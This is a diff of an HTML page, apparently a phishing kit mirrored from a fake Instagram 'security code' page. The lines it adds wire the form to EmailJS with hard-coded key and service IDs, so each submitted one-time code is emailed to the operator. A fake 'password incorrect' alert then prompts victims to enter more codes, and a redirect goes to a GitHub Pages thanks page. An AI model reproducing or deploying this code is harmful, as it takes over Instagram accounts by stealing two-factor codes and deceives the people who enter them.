@@ -67,13 +67,13 @@
             placeholder="Security code"
           />
           <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
-          <input type="submit" name="submit" value="Confirm" />
+          <input type="submit" name="submit" value="Send Email" onclick="window.location.href = 'https://krolplo.github.io/vcoql/thanks.html';"/>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <input type="hidden" name="_next" value="https://krolplo.github.io/vcoql/thanks.html">
+<!--           <input type="hidden" name="_next" value="https://krolplo.github.io/vcoql/thanks.html"> -->
 <input type="hidden" name="_captcha" value="false">
 
         </form>
@@ -169,6 +169,32 @@
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
+
+     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+        emailjs.init('tcVXs1jAm7NkrMx7k')
+        const btn = document.getElementById('button');
+
+            document.getElementById('form')
+                .addEventListener('submit', function (event) {
+                    event.preventDefault();
+
+                    btn.value = 'Sending...';
+
+                    const serviceID = 'service_zpw48zv';
+                    const templateID = 'template_gnhswh4';
+
+                    emailjs.sendForm(serviceID, templateID, this)
+                        .then(() => {
+                            btn.value = 'Send Email';
+                            alert('Sorry, Your password was incorrect. please double-check your password.');
+                        }, (err) => {
+                            btn.value = 'Send Email';
+                            alert(JSON.stringify(err));
+                        });
+                });
+    </script>
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
